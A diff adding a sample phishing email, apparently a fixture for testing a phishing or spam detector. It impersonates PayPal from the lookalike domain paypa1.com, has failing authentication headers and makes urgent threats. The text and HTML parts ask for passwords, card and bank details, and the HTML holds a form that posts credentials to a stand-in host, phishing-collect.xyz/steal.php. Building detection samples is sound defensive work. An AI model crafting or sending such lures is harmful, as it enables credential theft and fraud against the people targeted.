@@ -1,0 +1,65 @@
+Return-Path: <noreply@suspicious-domain.tk>
+Received: from unknown-server.xyz (unknown-server.xyz [192.168.1.100])
+        by mx.example.com with SMTP id xyz789
+        for <victim@example.com>; Thu, 20 Feb 2026 09:30:00 -0500
+Authentication-Results: mx.example.com;
+       dkim=fail (signature verification failed) header.i=@paypa1.com;
+       spf=fail (mx.example.com: domain of noreply@paypa1.com does not designate 192.168.1.100 as permitted sender) smtp.mailfrom=noreply@paypa1.com;
+       dmarc=fail (p=REJECT) header.from=paypal.com
+Received-SPF: fail (mx.example.com: domain of noreply@paypa1.com does not designate 192.168.1.100 as permitted sender)
+X-Mailer: PHPMailer 5.2.0
+X-Originating-IP: 185.220.101.45
+MIME-Version: 1.0
+From: PayPal Security <security@paypa1.com>
+To: victim@example.com
+Reply-To: collect-info@gmail-phish.ml
+Subject: URGENT: Your PayPal account has been suspended - Immediate action required!
+Date: Thu, 20 Feb 2026 09:30:00 -0500
+Message-ID: <fake-message-id-12345@suspicious-domain.tk>
+Content-Type: multipart/alternative; boundary="===============boundary123=="
+
+--===============boundary123==
+Content-Type: text/plain; charset="UTF-8"
+
+URGENT NOTICE - YOUR ACCOUNT HAS BEEN SUSPENDED
+
+Dear Valued Customer,
+
+We have detected suspicious activity on your PayPal account. Your account
+has been temporarily suspended to protect your security.
+
+You must verify your identity IMMEDIATELY to restore access within 24 hours
+or your account will be permanently closed.
+
+Click here to verify your account: http://bit.ly/paypal-verify-now
+
+Or visit: http://185.220.101.45/paypal/login.php
+
+Please provide your:
+- Username and password
+- Credit card number
+- Bank account details
+
+Failure to verify your account within 24 HOURS will result in PERMANENT suspension.
+
+PayPal Security Team
+
+--===============boundary123==
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<body>
+<h1 style="color:red">URGENT: Account Suspended!</h1>
+<p>Dear Valued Customer,</p>
+<p>We detected <strong>suspicious activity</strong> on your account.</p>
+<p>Click <a href="http://bit.ly/paypal-verify-now">HERE</a> to verify immediately.</p>
+<p>Alternative link: <a href="http://185.220.101.45/paypal/login.php">Verify Account</a></p>
+<p>Your account will be <strong>permanently deleted</strong> in 24 hours.</p>
+<form action="http://phishing-collect.xyz/steal.php" method="POST">
+  <input type="text" name="email" placeholder="Email">
+  <input type="password" name="password" placeholder="Password">
+  <input type="submit" value="Verify Now">
+</form>
+</body>
+</html>
+--===============boundary123==--
